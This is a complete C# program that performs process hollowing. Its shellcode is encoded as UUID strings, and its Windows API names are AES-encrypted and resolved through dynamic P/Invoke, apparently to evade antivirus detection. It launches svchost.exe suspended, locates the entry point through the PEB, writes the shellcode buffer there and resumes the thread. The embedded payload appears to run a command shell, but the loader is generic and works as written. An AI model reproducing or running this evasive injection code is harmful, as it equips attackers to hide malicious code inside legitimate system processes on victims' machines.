using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace UUID_Process_Hollowing_Dynamic_Invoke
{
    class Program
    {

        static string GlobalKey = "cG3vF4edNYLMqYI3BzFLmH730g0lRB+pVoRQA5PNz6M=";
        static string GlobalIV = "f9D/TaL9AoZSWoMHMq1xIA==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0x97, 0x39, 0x32, 0x66, 0x48, 0x14, 0x9F, 0xAC, 0x94, 0x0C, 0xB4, 0xC5, 0x1F, 0x41, 0xA8, 0x0D };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dntdll_dll_Bytes = new byte[16] { 0xA8, 0x35, 0x98, 0xEF, 0x3F, 0x7D, 0xB5, 0x3D, 0x09, 0x06, 0x72, 0x02, 0x46, 0x15, 0xA2, 0x33 };
        static string dntdll_dll = DecryptAESAsString(dntdll_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateProcess_Bytes = new byte[16] { 0x28, 0x05, 0xF1, 0x6D, 0xED, 0xDC, 0x61, 0x91, 0x74, 0xBC, 0xDB, 0x9A, 0x9E, 0x85, 0x84, 0x5A };
        static string dCreateProcess = DecryptAESAsString(dCreateProcess_Bytes, GlobalKey, GlobalIV);

        static byte[] dReadProcessMemory_Bytes = new byte[32] { 0xEF, 0xCB, 0x99, 0xF2, 0x84, 0x04, 0x15, 0xF7, 0x1A, 0x91, 0xCC, 0x5B, 0x0A, 0xB1, 0x4A, 0x07, 0xFF, 0x5F, 0x43, 0x03, 0xF0, 0xE5, 0xDE, 0x88, 0xE0, 0x51, 0x82, 0x26, 0x1D, 0x41, 0x60, 0xD4 };
        static string dReadProcessMemory = DecryptAESAsString(dReadProcessMemory_Bytes, GlobalKey, GlobalIV);

        static byte[] dWriteProcessMemory_Bytes = new byte[32] { 0x9B, 0x28, 0x5A, 0x83, 0x79, 0x91, 0xFC, 0xEE, 0xA3, 0xDC, 0x67, 0xF0, 0x29, 0x99, 0xF1, 0x5A, 0x37, 0x82, 0x3A, 0x9C, 0x7C, 0x4A, 0xF0, 0xF8, 0x25, 0x71, 0x6C, 0x4A, 0xE6, 0x4B, 0x73, 0x41 };
        static string dWriteProcessMemory = DecryptAESAsString(dWriteProcessMemory_Bytes, GlobalKey, GlobalIV);

        static byte[] dResumeThread_Bytes = new byte[16] { 0x16, 0x76, 0x14, 0x51, 0x38, 0x43, 0x54, 0x49, 0x8A, 0x5C, 0x5B, 0x0F, 0x83, 0x76, 0x07, 0x23 };
        static string dResumeThread = DecryptAESAsString(dResumeThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dZwQueryInformationProcess_Bytes = new byte[32] { 0x2F, 0x55, 0x1F, 0x7E, 0xFD, 0x19, 0xF7, 0x4D, 0x72, 0x39, 0x1C, 0x23, 0xA8, 0x50, 0x3F, 0x60, 0x25, 0x21, 0x76, 0xEB, 0x08, 0x3C, 0x29, 0x84, 0x0A, 0xDD, 0x5A, 0xDE, 0xE5, 0x8F, 0x8E, 0x03 };
        static string dZwQueryInformationProcess = DecryptAESAsString(dZwQueryInformationProcess_Bytes, GlobalKey, GlobalIV);


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, argumentTypes);
        }
        public static bool fCreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            var parameterTypes = new Type[] { typeof(string), typeof(string), typeof(IntPtr), typeof(IntPtr), typeof(bool), typeof(uint), typeof(IntPtr), typeof(string), typeof(STARTUPINFO).MakeByRefType(), typeof(PROCESS_INFORMATION).MakeByRefType() };
            var arguments = new object[] { lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, new PROCESS_INFORMATION() };

            bool result = (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dCreateProcess, arguments, parameterTypes);

            lpProcessInformation = (PROCESS_INFORMATION)arguments[9];
            return result;
        }


        public static int fZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(int), typeof(PROCESS_BASIC_INFORMATION).MakeByRefType(), typeof(uint), typeof(uint).MakeByRefType() };
            var arguments = new object[] { hProcess, procInformationClass, procInformation, ProcInfoLen, retlen };

            int result = (int)DynamicInvoke(typeof(int), dntdll_dll, dZwQueryInformationProcess, arguments, parameterTypes);

            procInformation = (PROCESS_BASIC_INFORMATION)arguments[2];
            retlen = (uint)arguments[4];
            return result;
        }


        public static bool fReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var arguments = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dReadProcessMemory, arguments, parameterTypes);

            lpNumberOfBytesRead = (IntPtr)arguments[4];
            return result;
        }


        public static bool fWriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(byte[]), typeof(int), typeof(IntPtr).MakeByRefType() };
            var arguments = new object[] { hProcess, lpBaseAddress, lpBuffer, dwSize, IntPtr.Zero };

            bool result = (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dWriteProcessMemory, arguments, parameterTypes);

            lpNumberOfBytesWritten = (IntPtr)arguments[4];
            return result;
        }


        public static uint fResumeThread(IntPtr hThread)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hThread };

            return (uint)DynamicInvoke(typeof(uint), dKernel32_dll, dResumeThread, arguments, parameterTypes);
        }

        static void Main(string[] args)
        {

            string[] uuids = {

                "e48348fc-e8f0-00c0-0000-415141505251",
                "d2314856-4865-528b-6048-8b5218488b52",
                "728b4820-4850-b70f-4a4a-4d31c94831c0",
                "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
                "48514152-528b-8b20-423c-4801d08b8088",
                "48000000-c085-6774-4801-d0508b481844",
                "4920408b-d001-56e3-48ff-c9418b348848",
                "314dd601-48c9-c031-ac41-c1c90d4101c1",
                "f175e038-034c-244c-0845-39d175d85844",
                "4924408b-d001-4166-8b0c-48448b401c49",
                "8b41d001-8804-0148-d041-5841585e595a",
                "59415841-5a41-8348-ec20-4152ffe05841",
                "8b485a59-e912-ff57-ffff-5d48ba010000",
                "00000000-4800-8d8d-0101-000041ba318b",
                "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
                "c48348d5-3c28-7c06-0a80-fbe07505bb47",
                "6a6f7213-5900-8941-daff-d5636d642e65",
                "2f206578-206b-7069-636f-6e666967202f",
                "006c6c61-9090-9090-9090-909090909090",

            };

            byte[] Warhead = new byte[uuids.Length * 16];
            for (int i = 0; i < uuids.Length; i++)
            {
                Guid guid = Guid.Parse(uuids[i]);
                byte[] guidBytes = guid.ToByteArray();
                Buffer.BlockCopy(guidBytes, 0, Warhead, i * 16, 16);
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = fCreateProcess(
                null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;

            fZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            fReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            fReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            fWriteProcessMemory(hProcess, addressOfEntryPoint, Warhead, Warhead.Length, out nRead);

            fResumeThread(pi.hThread);
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {

                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
